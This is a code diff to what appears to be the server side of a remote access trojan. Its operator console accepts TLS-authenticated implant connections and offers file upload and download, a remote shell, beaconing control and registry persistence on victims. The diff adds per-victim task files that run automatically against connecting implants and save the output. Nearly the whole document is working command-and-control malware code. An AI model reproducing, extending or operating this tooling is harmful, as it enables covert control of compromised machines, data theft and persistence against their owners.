@@ -2,10 +2,11 @@
 import socket, ssl, persist, beacon
 from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
 from printlib import *
-from os import path, remove, kill, getpid
+from os import path, remove, kill, getpid, listdir
 from sys import exit
+from sys import path as sys_path
 from signal import SIGTERM
-from tasker import task_list
+import tasker
 
 VERBOSE = True
 
@@ -143,18 +144,72 @@ def file_transfer_put(conn, commands):       #push file to server
     conn.send("[END]".encode('utf-8'))
     f.close()
 
-def listen_for_data(conn):
+def listen_for_data(conn, mode="print"):
     data = ""
     while not data.endswith('[END]'):
         recv = conn.recv(128)
         recv_decoded = recv.decode('utf-8')
         data = data + recv_decoded
-    print(data.rstrip("[END]"))
+    if mode != "print":
+        return data.rstrip("[END]")
+    else:
+        print(data.rstrip("[END]"))
 
 def kill_session(conn, source):
     print_info("Killing {}".format(source))
     send_data(conn, "[kill]")
     conn.close()
+
+def query_for_tasklist(machine_addr):
+    try:
+        task_files = listdir('tasks')
+        if machine_addr in task_files:
+            if VERBOSE:
+                print_info("Found a task file")
+            return True
+        else:
+            return False
+    except FileNotFoundError:
+        print_fail("Unable to find file")
+        return False
+            
+def load_tasks(task_file):
+    temp_list = []
+    with open(path.join("tasks", task_file), 'r') as file:
+        for task in file:
+            if task != "\n":
+                temp_list.append(task)
+    return temp_list
+
+def run_tasklist(conn, task_list, save_file_name):
+    with open(save_file_name, 'w') as save_file:
+        for task in task_list:
+            send_data(conn, task)
+            output = listen_for_data(conn)
+            section = "*****TASK*****\n{}".format(task)
+            save_file.write(section + "\n")
+            section = "*****OUTPUT*****\n{}".format(output)
+            save_file.write(section + "\n")
+    print_good("Tasks Complete!  Saved Here: {}".format(save_file_name))
+
+def delete_task_file(task_file_name):
+    try:
+        if path.isfile(path.join("tasks") + task_file_name) is True:
+            remove(path.join("tasks") + task_file_name)
+            if VERBOSE:
+                print_info("Successful Remove Task List")
+    except:
+        pass
+
+def get_uuid(conn):
+    if VERBOSE:
+        print_info("Asking for UUID")
+    send_data(conn,"[UUID]")
+    uuid = listen_for_data(conn, "store")
+    if len(uuid) != 32:
+        return False
+    else:
+        return uuid
 
 def listen():
     global conn
@@ -165,21 +220,31 @@ def listen():
     3 - Kill Process (Do not beacon)
     4 - Drop Connection (start beaconing)
     5 - Persistence
+    6 - Print uuid
     shell - Start a Shell
     beacon - Change Beacon Interval"""
 
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
     context.verify_mode = ssl.CERT_REQUIRED
-    context.load_cert_chain(certfile='./server_cert', keyfile='./server_key')
-    context.load_verify_locations(cafile='./client_certs')
+    context.load_cert_chain(certfile='server_cert', keyfile='server_key')
+    context.load_verify_locations(cafile='client_certs')
     #delete_keys()
     bindsocket = socket.socket()
     bindsocket.bind((listen_addr, listen_port))
     bindsocket.listen(1)
-    
+    if listdir("tasks") != []:
+        ans = print_question("Found Pending Tasks, Run [y]/n")
+        if ans != "n":
+            run_tasks = True
+        else:
+            run_tasks = False
+    else:
+        run_tasks = False
 
     while True:
         try:
+            if run_tasks == True and VERBOSE is True:
+                print_info("Ready to Run a Task File")
             print_info("Listening for incoming TCP connection on {}:{}".format(listen_addr,listen_port))
             newsocket, fromaddr = bindsocket.accept()
         except KeyboardInterrupt:
@@ -191,112 +256,123 @@ def listen():
             print_info("SSL established. Peer: {}".format(conn.getpeercert()))        
             source = "{}:{}".format(fromaddr[0],fromaddr[1])
             cmd = ""
-            if task_list:
-                for task in task_list:
-                    send_data(conn, task)
-                    listen_for_data(conn)
-                conn.close()
-            try:
-                while True:
-                    prompt = source + "> "
-                    if cmd == "":
-                        print(options)
-                        cmd = input(prompt) # Get user input and store it in command variable
-                    #print(command)
+            if run_tasks is True:
+                #ask for uuid
+                uuid = get_uuid(conn)
+                if query_for_tasklist(uuid):
+                    task_list = load_tasks(uuid)
+                    for task in task_list:
+                        send_data(conn, task)
+                        listen_for_data(conn)
+                    conn.shutdown(socket.SHUT_RDWR)
+                    conn.close()
+            while True:
+                if run_tasks is True:
+                    break
+                prompt = source + "> "
+                if cmd == "":
+                    print(options)
+                    cmd = input(prompt) # Get user input and store it in command variable
+                #print(command)
 
-                    if cmd == 'quit' or cmd == 'exit':
-                        conn.close()
-                        exit()
-                    elif cmd == "1":
-                        command = input("get > ")
-                        if command != "back":
-                            command = "get " + command
-                            path_exists = True
-                            if len(command.split()) == 1:
-                                print_warn("Incomplete command") 
-                            elif len(command.split())== 2:
-                                command = command + " " + command.split()[1]
+                if cmd == 'quit' or cmd == 'exit':
+                    conn.close()
+                    exit()
+                elif cmd == "1":
+                    command = input("get > ")
+                    if command != "back":
+                        command = "get " + command
+                        path_exists = True
+                        if len(command.split()) == 1:
+                            print_warn("Incomplete command") 
+                        elif len(command.split())== 2:
+                            command = command + " " + command.split()[1]
+                            file_transfer_get(conn, command)
+                        elif len(command.split())== 3:
+                            if path.dirname(command.split()[2]) != "":
+                                path_exists = path.exists(path.dirname(command.split()[2]))
+                            if path_exists:
                                 file_transfer_get(conn, command)
-                            elif len(command.split())== 3:
-                                if path.dirname(command.split()[2]) != "":
-                                    path_exists = path.exists(path.dirname(command.split()[2]))
-                                if path_exists:
-                                    file_transfer_get(conn, command)
-                                else:
-                                    print_warn("Destination file path does not exist")
-                        cmd = ""
-                    elif cmd == "2":
-                        command = input("put > ")
-                        if command != "back":
-                            command = "put " + command
-                            path_exists = True
-                            if len(command.split()) == 1:
-                                print_warn("Incomplete command") 
-                            elif len(command.split()) == 2:      #put example
-                                if path.isfile(command.split()[1]):
-                                    command = command.split()[1] + " " + path.basename(command.split()[1])
-                                    file_transfer_put(conn, command)
-                                else:
-                                    print_warn("File not Found")
-                            elif len(command.split())== 3:        #put example temp  [writes example as temp]
-                                if path.isfile(command.split()[1]):
-                                    file_transfer_put(conn, command)   #(example, temp)  client will determine if arg2 destination filepath exists
-                                else:
-                                    print_warn("Unable to locate file")
-                        cmd = ""
-                    elif cmd == "3": # If we got terminate command, inform the client and close the connect and break the loop
-                        kill_session(conn, source)
-                        break
-                    elif cmd == "4":        #start beaconing
-                        beacon.start_beaconing(conn)
-                    elif cmd == "5":
-                        ans = print_question("Select a Module:\n1 - Add\n2 - Query\n3 - Remove\n")
-                        if ans == "1":
-                            persist.add_reg_persistence(conn)
-                        elif ans == "2":
-                            persist.query_reg_persistence(conn)
-                        elif ans == "3":
-                            persist.delete_reg_persistence(conn)
-                        else:
-                            cmd = ""
-                    elif cmd.lower() == "shell":
-                        while cmd.lower() == "shell":
-                            command = input("shell > ")
-                            forbidden = ['get ', 'get', 'put ', 'put']
-                            for item in forbidden:
-                                if item in command.split():
-                                    command = ""
-                            if command in forbidden:
-                                command = ""
-                            elif command == "back":
-                                cmd = ""
-                            elif command == "":
-                                pass
                             else:
-                                data = ""
-                                send_data(conn, command)
-                                #print_info("Sent:\n"+command)
-                                while not data.endswith('[END]'):
-                                    recv = conn.recv(128)
-                                    recv_decoded = recv.decode('utf-8')
-                                    data = data + recv_decoded
-                                print(data.rstrip("[END]"))
-                                data = ""
-                    elif cmd.upper() == "BEACON":
-                        ans = print_question("Select Option:\n1 - Query\n2 - Configure\n")
-
-                        if ans == "1":
-                            beacon.query(conn)                            
-                        if ans == "2":    
-                            beacon.configure(conn)
-                        else:
-                            cmd = ""
-                        
+                                print_warn("Destination file path does not exist")
+                    cmd = ""
+                elif cmd == "2":
+                    command = input("put > ")
+                    if command != "back":
+                        command = "put " + command
+                        path_exists = True
+                        if len(command.split()) == 1:
+                            print_warn("Incomplete command") 
+                        elif len(command.split()) == 2:      #put example
+                            if path.isfile(command.split()[1]):
+                                command = command.split()[1] + " " + path.basename(command.split()[1])
+                                file_transfer_put(conn, command)
+                            else:
+                                print_warn("File not Found")
+                        elif len(command.split())== 3:        #put example temp  [writes example as temp]
+                            if path.isfile(command.split()[1]):
+                                file_transfer_put(conn, command)   #(example, temp)  client will determine if arg2 destination filepath exists
+                            else:
+                                print_warn("Unable to locate file")
+                    cmd = ""
+                elif cmd == "3": # If we got terminate command, inform the client and close the connect and break the loop
+                    kill_session(conn, source)
+                    break
+                elif cmd == "4":        #start beaconing
+                    beacon.start_beaconing(conn)
+                elif cmd == "5":
+                    ans = print_question("Select a Module:\n1 - Add\n2 - Query\n3 - Remove\n")
+                    if ans == "1":
+                        persist.add_reg_persistence(conn)
+                    elif ans == "2":
+                        persist.query_reg_persistence(conn)
+                    elif ans == "3":
+                        persist.delete_reg_persistence(conn)
                     else:
                         cmd = ""
+                elif cmd == "6":
+                    uuid = get_uuid(conn)
+                    print_good("Found UUID: {}".format(uuid))
+                elif cmd.lower() == "shell":
+                    while cmd.lower() == "shell":
+                        command = input("shell > ")
+                        forbidden = ['get ', 'get', 'put ', 'put']
+                        for item in forbidden:
+                            if item in command.split():
+                                command = ""
+                        if command in forbidden:
+                            command = ""
+                        elif command == "back":
+                            cmd = ""
+                        elif command == "":
+                            pass
+                        else:
+                            data = ""
+                            send_data(conn, command)
+                            #print_info("Sent:\n"+command)
+                            if VERBOSE:
+                                print_info("Waiting for data...")
+                            while not data.endswith('[END]'):
+                                recv = conn.recv(128)
+                                recv_decoded = recv.decode('utf-8')
+                                data = data + recv_decoded
+                            print(data.rstrip("[END]"))
+                            data = ""
+                elif cmd.upper() == "BEACON":
+                    ans = print_question("Select Option:\n1 - Query\n2 - Configure\n")
 
-            except KeyboardInterrupt:
-                kill_session(conn, source)
+                    if ans == "1":
+                        beacon.query(conn)                            
+                    if ans == "2":    
+                        beacon.configure(conn)
+                    else:
+                        cmd = ""
+                    
+                else:
+                    cmd = ""
+
+        except KeyboardInterrupt:
+            kill_session(conn, source)
         except ssl.SSLError:
             print_fail("Received Connection From Malformed (SSL) Session")
         except KeyboardInterrupt:
